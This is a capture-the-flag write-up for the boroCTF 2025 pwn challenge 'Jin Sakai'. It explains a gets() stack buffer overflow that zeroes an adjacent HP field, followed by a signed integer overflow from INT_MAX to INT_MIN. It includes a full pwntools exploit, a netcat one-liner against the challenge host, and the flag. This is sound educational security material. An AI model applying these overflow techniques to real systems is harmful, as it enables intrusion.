# boroCTF 2025 - Jin Sakai

**Category:** Pwn
**Difficulty:** Easy
**Points:** 100

## Description

> The Eagle's curse has completely made him go mad...
>
> Once a hero of Tsushima, now a bloodthirsty warrior.
>
> Please put an end to this madness.

The challenge provides a network service and a downloadable binary.

## Initial Analysis

After loading the binary into Ghidra, the program logic was split into two phases.

### Phase 1

A structure is allocated on the stack:

```c
struct GameState {
    char buffer[32];
    int samurai_hp;
};
```

The Samurai's HP is initialized to:

```c
state.samurai_hp = 999;
```

The program then asks for a battle cry:

```c
gets(state.buffer);
```

The use of `gets()` immediately stands out because it performs no bounds checking.

Since `buffer` is only 32 bytes long, writing more than 32 bytes allows us to overwrite the adjacent `samurai_hp` field.

The program proceeds only if:

```c
if (state.samurai_hp <= 0)
```

Therefore, we can overwrite `samurai_hp` with `0` and bypass the boss's armor.

### Exploitation

Payload:

```python
b"A"*32 + b"\x00\x00\x00\x00"
```

This fills the buffer and overwrites `samurai_hp` with zero.

---

## Phase 2

After passing the first phase, the Samurai transforms:

```c
samurai_hp = INT_MAX;
```

which corresponds to:

```text
2147483647
```

The game offers several actions. One of them allows using an item called **The Beast**.

Relevant code:

```c
samurai_hp += amount;
```

The win condition is:

```c
if (samurai_hp == INT_MIN)
```

Since the HP starts at `INT_MAX`, adding `1` causes a signed integer overflow:

```text
2147483647 + 1 = -2147483648
```

which is exactly:

```c
INT_MIN
```

As a result, the victory condition is immediately satisfied.

---

## Full Exploit

```python
from pwn import *

p = remote("w4owkcjzvv0e.boroctf.com", 53217)

# Phase 1: overwrite HP
p.sendline(b"A"*32 + p32(0))

# Phase 2: Use Item -> Health Potion -> The Beast -> amount=1
p.sendline(b"3")
p.sendline(b"1")
p.sendline(b"2")
p.sendline(b"1")

p.interactive()
```

---

## Alternative One-Liner

```bash
(
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32+b"\x00\x00\x00\x00\n")'
echo 3
echo 1
echo 2
echo 1
) | nc w4owkcjzvv0e.boroctf.com 53217
```

---

## Flag

```text
boroCTF{gh0st_0f_3xpl01t4t10n}
```

## Lessons Learned

* Never use `gets()` in modern applications.
* Adjacent stack variables can often be modified through buffer overflows.
* Integer overflows remain a common source of vulnerabilities.
* Chaining multiple simple bugs can completely break program logic.

This challenge combines two classic vulnerabilities:

1. Stack-based buffer overflow (`gets`)
2. Signed integer overflow (`INT_MAX + 1 -> INT_MIN`)

A very beginner-friendly pwn challenge that demonstrates how small mistakes can be chained together to achieve code logic manipulation.

